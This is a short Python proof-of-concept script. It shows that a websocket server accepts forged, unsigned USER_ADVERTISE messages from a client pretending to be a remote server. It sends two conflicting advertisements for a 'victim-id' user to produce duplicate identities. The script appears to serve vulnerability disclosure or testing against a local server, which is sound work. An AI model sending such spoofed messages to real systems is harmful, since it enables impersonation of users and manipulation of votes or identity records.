"""
Proof of Concept: Remote Duplicate Username

This script demonstrates a vulnerability where the server fails to authenticate or restrict
USER_ADVERTISE messages, allowing a malicious actor to impersonate and create duplicate
user identities from spoofed server_id sources. This can lead to confusion in user identification,
Vote manipulation in distributed systems, or other impersonation attacks.

In a secure system, inter-server communication should be authenticated and validated
to prevent unauthorized user advertisements.
"""

import asyncio
import json
import time

import websockets


def now(): return int(time.time() * 1000)


async def main(host="127.0.0.1", port=8080):
    uri = f"ws://{host}:{port}/ws"
    async with websockets.connect(uri) as ws:
        # No handshake as server; we are a client socket but will send a server-only message.
        uid = "victim-id"
        for idx in (1, 2):
            await ws.send(json.dumps({
                "type": "USER_ADVERTISE", "from": "fake-remote-server", "to": "*", "ts": now(),
                "payload": {"user_id": uid, "server_id": f"s-{idx}", "pubkey": f"PUBKEY-{idx}", "meta": {}},
                "sig": ""  # server SHOULD verify/gate this; it doesn't.
            }))
            await asyncio.sleep(0.2)
        print(f"[OK] Sent two conflicting USER_ADVERTISE for user_id={uid} from different 'server_id's.")


if __name__ == "__main__":
    asyncio.run(main())
